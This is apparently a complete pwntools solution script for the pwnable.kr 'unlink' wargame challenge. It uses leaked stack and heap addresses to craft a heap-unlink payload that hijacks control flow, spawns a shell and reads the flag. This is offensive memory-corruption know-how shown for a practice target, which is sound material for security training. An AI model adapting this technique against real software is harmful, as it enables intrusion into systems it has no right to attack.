#!/usr/bin/env python3
from pwn import *

SHELL_ADDR = 0x80484eb

s = ssh(user="unlink", host='pwnable.kr', port=2222, password="guest")

p = s.process(b"./unlink")

p.recvuntil(b"here is stack address leak: ")
stack_address = int(p.recvline(), 16)

return_address = stack_address - 24
saved_ebp_address = return_address - 4 

p.recvuntil(b"here is heap address leak: ")
heap_address = int(p.recvline(), 16)

p.recvuntil(b"now that you have leaks, get shell!\n")

payload_address = heap_address + 8

# ---------- payload ---------- #
payload = b"A" * 16  # pad

# saved_ebp = *(payload + 4028)
# *(payload + 4028) = ...  # we dont really care
payload += p32(payload_address + 4028)  # fd
payload += p32(saved_ebp_address)  # bk

payload += b"B" * 4000  # pad
payload += p32(payload_address + len(payload) + 8)  # (payload + 4028). after first leave, ebp will be set to this value
payload += p32(SHELL_ADDR)  # esp before returning from main

p.sendline(payload)

p.sendline(b"cat flag")

log.success(f"flag = '{p.recvline().decode().strip().removeprefix('$ ')}'")
